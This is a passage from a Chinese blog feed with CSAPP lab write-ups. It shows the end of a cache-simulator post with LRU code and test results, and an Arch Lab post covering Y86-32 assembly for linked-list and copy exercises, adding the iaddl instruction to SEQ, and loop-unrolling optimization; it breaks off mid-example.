进行选择驱逐</code></pre><p>所以，设计一个判满的函数：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">is_full</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历每一行，如果有效位为0则说明是空行，倘若没有找到标志位为0的行，则返回-1，说明需要进行驱赶。</p><p>调用 LRU 更新函数update_info函数进行更新：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void update<span class="hljs-constructor">_info(<span class="hljs-params">int</span> <span class="hljs-params">op_tag</span>, <span class="hljs-params">int</span> <span class="hljs-params">op_s</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> index = get<span class="hljs-constructor">_index(<span class="hljs-params">op_s</span>, <span class="hljs-params">op_tag</span>)</span>;<br>    <span class="hljs-keyword">if</span> (index<span class="hljs-operator"> == </span>-<span class="hljs-number">1</span>)<br>    &#123;<br>        miss_count++;   <span class="hljs-comment">//get_index函数如果返回-1，说明未命中， miss_count++</span><br>        <span class="hljs-keyword">if</span> (verbose)<br>            printf(<span class="hljs-string">&quot;miss &quot;</span>);<br>        <span class="hljs-built_in">int</span> i = is<span class="hljs-constructor">_full(<span class="hljs-params">op_s</span>)</span>;   <span class="hljs-comment">//is_full函数如果返回-1则说明要驱赶</span><br>        <span class="hljs-keyword">if</span>(i==-<span class="hljs-number">1</span>)&#123;<br>            eviction_count++;<br>            <span class="hljs-keyword">if</span>(verbose) printf(<span class="hljs-string">&quot;eviction&quot;</span>);<br>            i = find<span class="hljs-constructor">_LRU(<span class="hljs-params">op_s</span>)</span>;   <span class="hljs-comment">//调用find_LRU函数替换时间戳最大的行</span><br>        &#125;<br>        update(i,op_s,op_tag);   <span class="hljs-comment">//进行上面的操作后调用update函数对有效位标志位时间戳进行更新。</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        hit_count++;   <span class="hljs-comment">//不返回-1则命中</span><br>        <span class="hljs-keyword">if</span>(verbose)<br>            printf(<span class="hljs-string">&quot;hit&quot;</span>);<br>        update(index,op_s,op_tag);    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="结果测试"><a href="#结果测试" class="headerlink" title="结果测试"></a>结果测试</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fuzz</span>@ubuntu:~/Cache Lab/cachelab-handout$  make &amp;&amp; ./test-csim<br><span class="hljs-attribute">gcc</span> -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm <br><span class="hljs-comment"># Generate a handin tar file each time you compile</span><br><span class="hljs-attribute">tar</span> -cvf fuzz-handin.tar  csim.c trans.c <br><span class="hljs-attribute">csim</span>.c<br><span class="hljs-attribute">trans</span>.c<br>                        <span class="hljs-attribute">Your</span> simulator     Reference simulator<br><span class="hljs-attribute">Points</span> (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)       <span class="hljs-number">9</span>       <span class="hljs-number">8</span>       <span class="hljs-number">6</span>       <span class="hljs-number">9</span>       <span class="hljs-number">8</span>       <span class="hljs-number">6</span>  traces/yi2.trace<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)       <span class="hljs-number">4</span>       <span class="hljs-number">5</span>       <span class="hljs-number">2</span>       <span class="hljs-number">4</span>       <span class="hljs-number">5</span>       <span class="hljs-number">2</span>  traces/yi.trace<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)       <span class="hljs-number">2</span>       <span class="hljs-number">3</span>       <span class="hljs-number">1</span>       <span class="hljs-number">2</span>       <span class="hljs-number">3</span>       <span class="hljs-number">1</span>  traces/dave.trace<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)     <span class="hljs-number">167</span>      <span class="hljs-number">71</span>      <span class="hljs-number">67</span>     <span class="hljs-number">167</span>      <span class="hljs-number">71</span>      <span class="hljs-number">67</span>  traces/trans.trace<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)     <span class="hljs-number">201</span>      <span class="hljs-number">37</span>      <span class="hljs-number">29</span>     <span class="hljs-number">201</span>      <span class="hljs-number">37</span>      <span class="hljs-number">29</span>  traces/trans.trace<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)     <span class="hljs-number">212</span>      <span class="hljs-number">26</span>      <span class="hljs-number">10</span>     <span class="hljs-number">212</span>      <span class="hljs-number">26</span>      <span class="hljs-number">10</span>  traces/trans.trace<br>     <span class="hljs-attribute">3</span> (<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)     <span class="hljs-number">231</span>       <span class="hljs-number">7</span>       <span class="hljs-number">0</span>     <span class="hljs-number">231</span>       <span class="hljs-number">7</span>       <span class="hljs-number">0</span>  traces/trans.trace<br>     <span class="hljs-attribute">6</span> (<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)  <span class="hljs-number">265189</span>   <span class="hljs-number">21775</span>   <span class="hljs-number">21743</span>  <span class="hljs-number">265189</span>   <span class="hljs-number">21775</span>   <span class="hljs-number">21743</span>  traces/long.trace<br>    <span class="hljs-attribute">27</span><br><br><span class="hljs-attribute">TEST_CSIM_RESULTS</span>=<span class="hljs-number">27</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——archlab32</title>
    <link href="/2023/10/08/CSAPP%E2%80%94%E2%80%94archlab32/"/>
    <url>/2023/10/08/CSAPP%E2%80%94%E2%80%94archlab32/</url>
    
    <content type="html"><![CDATA[<h2 id="实验概要"><a href="#实验概要" class="headerlink" title="实验概要"></a>实验概要</h2><p>学习设计和优化Y86-64处理器，分成了3个部分，第一部分熟悉Y86指令，第二部分熟悉pipeline的设计，第三部分结合前两部分综合优化，获得尽可能低的CPE。但是本实验采用32位架构，与64位相比注意寄存器、操作数大小的改变。<br>A 部分需要我们写一些简单的Y86程序，从而熟悉Y86工具的使用；在 B 部分中，我们要用一个新的指令来扩展SEQ；C 部分是本实验的核心，我们要通过理解流水线的过程以及利用新的指令来优化程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sim<br>  - misc    <span class="hljs-comment"># 包含了 指令集(isa)/汇编器(yas)/模拟器(yis)</span><br>  - <span class="hljs-built_in">seq</span>     <span class="hljs-comment"># 顺序执行模式 hcl 的实现</span><br>  - pipe    <span class="hljs-comment"># 流水线执行模式 hcl 的实现</span><br>  - ptest   <span class="hljs-comment"># 测试脚本</span><br>  - y86-code <span class="hljs-comment"># Y86-64 指令集的示例代码</span><br><br></code></pre></td></tr></table></figure><p>回顾一下Y86-64指令集：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># movq i--&gt;r: 从立即数到寄存器...m（存储器）、r（寄存器）</span><br>irmovq, rrmovq, mrmovq, rmmovq<br><br><span class="hljs-comment"># Opq</span><br>addq, subq, andq, xorq<br><br><span class="hljs-comment"># 跳转 jXX</span><br>jmp, jle, jl, je, jne, jge, jg<br><br><span class="hljs-comment"># 条件传送 cmovXX</span><br>cmovle, cmovl, cmove, cmovne, cmovge, cmovg<br><br>call, ret<br>pushq, popq<br><br><span class="hljs-comment"># 停止指令的执行</span><br>halt<br><br><span class="hljs-comment"># 寄存器</span><br>%rax, %rcx, %rdx<br>%rbx, %rsp, %rbp<br>%rsi, %rdi, %r8<br>%r9, %r10, %r11<br>%r12, %r13, %r14<br></code></pre></td></tr></table></figure><p>Y86-32架构和Y86-64架构主要区别在于字长（数据和寄存器的位数）和指令集架构的复杂性。以下是它们之间的主要不同之处：</p><ul><li><p>字长（Word Length）：</p><pre><code class="hljs">  Y86-32：Y86-32是一个32位架构，意味着它的寄存器、数据通路和地址总线都是32位宽度。这意味着它能够处理32位宽度的整数和内存地址。  Y86-64：Y86-64是一个64位架构，它的寄存器、数据通路和地址总线都是64位宽度。这使得它能够处理更大的整数和内存地址，提供更大的寻址空间。</code></pre></li><li><p>寄存器数量：</p><pre><code class="hljs">  Y86-32：Y86-32通常包含一组较少的通用寄存器，如 %eax、%ebx、%ecx 等，以及一些特定用途的寄存器。  Y86-64：Y86-64通常包含更多的通用寄存器，如 %rax、%rbx、%rcx 等，以及扩展的SIMD寄存器（例如，xmm0、xmm1）等。这些额外的寄存器提供更强大的计算能力。</code></pre></li><li><p>指令集架构：</p><pre><code class="hljs">  Y86-32：Y86-32使用32位的指令集架构，指令通常包括32位的操作码和寄存器标识符。  Y86-64：Y86-64使用64位的指令集架构，指令包括64位的操作码和寄存器标识符。</code></pre></li><li><p>地址空间：</p><pre><code class="hljs">  Y86-32：Y86-32通常有较小的地址空间，通常为32位，限制了可寻址的内存范围。  Y86-64：Y86-64具有更大的地址空间，通常为64位，允许更多的内存寻址，特别适用于处理大内存应用。</code></pre></li><li><p>复杂性：</p><pre><code class="hljs">  Y86-32：Y86-32是一个相对简单的微处理器架构，通常用于教育和学术用途，重点在于教授计算机体系结构的基本概念。  Y86-64：Y86-64更复杂，更适用于实际应用，包括大型计算和操作系统开发。</code></pre></li></ul><h3 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h3><p>在这部分，要用Y86汇编代码实现examples.c中的三个函数。这三个函数都是与链表有关的操作，链表结点定义如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* linked list element */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ELE</span> &#123;<br>    <span class="hljs-type">long</span> val;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ELE</span> *next;<br>&#125; *list_ptr;<br></code></pre></td></tr></table></figure><p><strong>sum_list</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/* sum_list - Sum the elements of a linked list */</span><br>long sum_list(list_ptr ls)<br>&#123;<br>    long <span class="hljs-keyword">val</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (ls) &#123;<br>        <span class="hljs-keyword">val</span> += ls-&gt;<span class="hljs-keyword">val</span>;<br>        ls = ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">val</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题是一个链表求和,写成Y86-32程序</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># sum_list - Sum the elements of a linked list</span><br><span class="hljs-comment"># author: Deconx (modified for 32-bit)</span><br><br><span class="hljs-comment"># Execution begins at address 0</span><br>.pos <span class="hljs-number">0</span><br>irmovl stack, %esp     <span class="hljs-comment"># Set up stack pointer</span><br>call main              <span class="hljs-comment"># Execute main program</span><br>halt                   <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>.align <span class="hljs-number">4</span><br>ele1:<br>.long <span class="hljs-number">0x00a</span><br>.long ele2<br>ele2:<br>.long <span class="hljs-number">0x0b0</span><br>.long ele3<br>ele3:<br>.long <span class="hljs-number">0xc00</span><br>.long <span class="hljs-number">0</span><br><br>main:<br>irmovl ele1, %edi<br>call sum_list   <span class="hljs-comment"># sum_list(ele1)</span><br>ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %edi</span><br>sum_list:<br>irmovl $0, %eax<br>jmp test<br><br>loop:<br>mrmovl (%edi), %esi<br>addl %esi, %eax<br>mrmovl <span class="hljs-number">4</span>(%edi), %edi<br><br>test:<br>andl %edi, %edi         <span class="hljs-comment"># 用andl来设置CC</span><br>jne loop<br>ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><hr><p><strong>rsum_list</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* rsum_list - Recursive version of sum_list */</span><br>long rsum<span class="hljs-constructor">_list(<span class="hljs-params">list_ptr</span> <span class="hljs-params">ls</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ls)<br>        return <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br>        long <span class="hljs-keyword">val</span> = ls-&gt;<span class="hljs-keyword">val</span>;<br>        long rest = rsum<span class="hljs-constructor">_list(<span class="hljs-params">ls</span>-&gt;<span class="hljs-params">next</span>)</span>;<br>        return <span class="hljs-keyword">val</span> + rest;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是链表求和的递归实现</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># rsum_list - Recursive version of sum_list</span><br><span class="hljs-comment"># author: Deconx</span><br><br><span class="hljs-comment"># Execution begins at address 0</span><br>.pos <span class="hljs-number">0</span><br>irmovl stack, %esp      <span class="hljs-comment"># Set up stack pointer</span><br>call main               <span class="hljs-comment"># Execute main program</span><br>halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>.align <span class="hljs-number">4</span><br>ele1:<br>    .long <span class="hljs-number">0x00a</span><br>    .long ele2<br>ele2:<br>    .long <span class="hljs-number">0x0b0</span><br>    .long ele3<br>ele3:<br>    .long <span class="hljs-number">0xc00</span><br>    .long <span class="hljs-number">0</span><br><br>main:<br>    irmovl ele1,%edi<br>    call rsum_list<br>    ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %edi</span><br>rsum_list:<br>    andl %edi, %edi<br>    je <span class="hljs-keyword">return</span>               <span class="hljs-comment"># if(!ls)</span><br>    mrmovl (%edi), %ebx     <span class="hljs-comment"># val = ls-&gt;val</span><br>    mrmovl <span class="hljs-number">4</span>(%edi), %edi    <span class="hljs-comment"># ls = ls-&gt;next</span><br>    pushl %ebx<br>    call rsum_list          <span class="hljs-comment"># rsum_list(ls-&gt;next)</span><br>    popl %ebx<br>    addl %ebx, %eax         <span class="hljs-comment"># val + rest</span><br>    ret<br><br><span class="hljs-keyword">return</span>:<br>    irmovl $0, %eax<br>    ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><hr><p><strong>copy_block</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* copy_block - Copy src to dest and return xor checksum of src */</span><br>long copy<span class="hljs-constructor">_block(<span class="hljs-params">long</span> <span class="hljs-operator">*</span><span class="hljs-params">src</span>, <span class="hljs-params">long</span> <span class="hljs-operator">*</span><span class="hljs-params">dest</span>, <span class="hljs-params">long</span> <span class="hljs-params">len</span>)</span><br>&#123;<br>    long result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>        long <span class="hljs-keyword">val</span> = *src++;<br>        *dest++ = <span class="hljs-keyword">val</span>;<br>        result ^= <span class="hljs-keyword">val</span>;<br>        len--;<br>    &#125;<br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组赋值操作，返回值为原数组各项的按位异或</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># This is a y86-32 Assembly code modified from the original 64-bit version</span><br><br>.pos <span class="hljs-number">0</span><br>irmovl stack, %esp<br>call main<br>halt<br>.align <span class="hljs-number">4</span><br><span class="hljs-comment"># Source block</span><br>src:<br>    .long <span class="hljs-number">0x00a</span><br>    .long <span class="hljs-number">0x0b0</span><br>    .long <span class="hljs-number">0xc00</span><br><br><span class="hljs-comment"># Destination block</span><br>dest:<br>    .long <span class="hljs-number">0x111</span><br>    .long <span class="hljs-number">0x222</span><br>    .long <span class="hljs-number">0x333</span><br><br><span class="hljs-comment"># long copy_block(long* src, long* dest, long len)</span><br>copy_block:<br>    pushl %ebp      <span class="hljs-comment"># Save %ebp, for it is callee-save</span><br>    pushl %ecx      <span class="hljs-comment"># Save %ecx, for storing integer 1</span><br>    pushl %edx      <span class="hljs-comment"># Save %edx, for storing integer 4</span><br>    irmovl $1, %ecx<br>    irmovl $4, %edx<br>    irmovl $0, %eax <span class="hljs-comment"># result = 0</span><br>    jmp loop_test   <span class="hljs-comment"># Jump to the start point of loop</span><br>loop:<br>    mrmovl <span class="hljs-number">0</span>(%edi), %ebp  <span class="hljs-comment"># Use %ebp to save *edi</span><br>    addl %edx, %edi       <span class="hljs-comment"># edi++</span><br>    rmmovl %ebp, (%esi)   <span class="hljs-comment"># *esi = *(edi - 1)</span><br>    addl %edx, %esi       <span class="hljs-comment"># esi++</span><br>    xorl %ebp, %eax<br>    subl %ecx, %ebx<br>loop_test:<br>    andl %ebx, %ebx<br>    jg loop<br>    popl %edx<br>    popl %ecx<br>    popl %ebp<br>    ret<br><br>main:<br>    irmovl src, %edi<br>    irmovl dest, %esi<br>    irmovl $3, %ebx<br>    call copy_block<br>    ret<br><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><h3 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h3><p>任务：拓展SEQ处理器，即修改seq-full.hcl文件以支持iaddl。<br><strong>HCL描述</strong></p><p>就是用HCL语句描述硬件的实现,对应不同阶段，需要修改的内容不同</p><ul><li><p>取指阶段</p><pre><code class="hljs">  instr_valid：是否是一合法指令  need_regids：是否包括一个寄存器指示符字节  need_valC：是否包括一个常数字</code></pre></li></ul><p>iaddl指令满足以上3点，所以需要将iaddl加入进去</p><ul><li><p>译码和写回阶段</p><pre><code class="hljs">  valA 和 valB 负责存储从寄存器取出的值  valM 和 valE 负责输入要存入寄存器的值  srcA 和 srcB 负责给定要读取寄存器的地址  detE 和 detM 负责给定要存入数据的寄存器的地址</code></pre></li></ul><p>src提供一个地址，这个地址指示要读取哪个寄存器的数据</p><p>dst提供一个地址，指示要将从寄存器中读取到的数据存入到哪里</p><p>iaddl的指令结构与irmovl相似，都是由立即数和寄存器组成的</p><p>根据逻辑描述的</p><p><img src="/images/archlab-1.png"></p><p>iaddl指令要读取的寄存器和要写入的寄存器是同一个，均使用rb来指示</p><p>使用rB的为srcB和dstE，所以修改这两项</p><ul><li>执行阶段</li></ul><p>iaddl指令通过valB和valC将数据传入逻辑运算单元ALU B 和 ALU A</p><p>所以修改这两个逻辑运算单元的描述</p><p>同时iaddl指令涉及到更新标志位的操作，所以还需要修改set cc的硬件实现描述</p><ul><li>访存阶段</li></ul><p>iaddl在访存阶段没有操作，所以不需要修改</p><ul><li>更新pc阶段</li></ul><p>更新PC寄存器默认使用的就是valP，而iaddl使用的正是valP，所以不需要修改</p><h3 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h3><p>可以优化的有两部分</p><pre><code class="hljs">    ncopy.ys：汇编文件    pipe-full.c：HCL描述文件</code></pre><p>对于pipe-full.c可修改内容从直观上来说应当是不多的，因为毕竟涉及到硬件结构</p><p>主攻方向目测要放在汇编文件上</p><p>要优化的程序是一个复制程序，并返回大于0的元素个数</p><p>对汇编文件的优化对应书籍第5章-优化程序性能</p><p>对HCL描述文件的优化对应4.5-Y86-64的流水线实现</p><ol><li>修改pipe-full.hcl添加iaddl指令</li></ol><p>这个步骤理应当是我们在优化汇编代码时发现使用iaddl指令可以使程序跑得更快，但是既然Part B让我们做了这一步，就一定有应用的道理</p><p>它的优化原理是，addl指令只能在寄存器与寄存器之间进行运算，若想要实现寄存器与立即数运算，至少需要2条指令，而iaddl则只需要1条</p><ol start="2"><li><p>将ncopy.ys中立即数与寄存器之间的加法均改为iaddl指令</p></li><li><p>循环展开</p></li></ol><p>循环开始之前</p><ul><li>初始化eax为0<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">xorl <span class="hljs-built_in">%eax</span>, <span class="hljs-built_in">%eax</span><br></code></pre></td></tr></table></figure>判断edx(len)与6的大小关系</li></ul><p>大于等于6，进入处理完整6项的部分<br>小于6，进入处理不足6项的部分<br>令edx减去6，检查标志位即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iaddl</span> $-<span class="hljs-number">6</span>, %edx<br><span class="hljs-attribute">jl</span> Remain # len &lt; <span class="hljs-number">6</span>，进入Remain<br></code></pre></td></tr></table></figure><ul><li>Loop部分</li></ul><p>直接进入copy阶段</p><p>每一次copy的操作逻辑都是相同的，内容如下(以copy1为例，其余只需要需改ebx的地址和jle的地址即可)</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mel">mrmovl (%ebx), %esi<br>   mrmovl <span class="hljs-number">4</span>(%ebx), %edi<br>   rmmovl %esi, (%ecx)<br>   andl %esi, %esi<br>   jle copy2<br>   iaddl $1, %eax<br></code></pre></td></tr></table></figure><ul><li>nLoop部分</li></ul><p>需要移动ebx，ecx，修改长度值</p><p>处理了4部分，即%ebx, %ebx+4, %ebx+8, %ebx+12，所以偏移量为16</p><p>同时长度应当减少6</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">addl $24, %ebx<br>   addl $24, %ecx<br>   iaddl $-<span class="hljs-number">6</span>, %edx<br>   jge Loop<br></code></pre></td></tr></table></figure><ul><li>Remain部分</li></ul><p>进入此部分，说明长度值可能为0，1，2，3，4 ,5,对应edx的值为-5,-4，-3，-2，-1</p><p>需要恢复为正常值，edx的定义为剩余长度值，显然通过+6恰好对应剩余长度值</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">iaddl $<span class="hljs-number">6</span>, <span class="hljs-meta">%</span>edx<br>je <span class="hljs-keyword">Do</span><span class="hljs-symbol">ne</span><br></code></pre></td></tr></table></figure><ul><li>Rcopy部分</li></ul><p>每一次Rcopy的操作逻辑都是相同的，内容如下(以Rcopy1为例，其余只需要需改edi,esi和jle的地址即可)</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 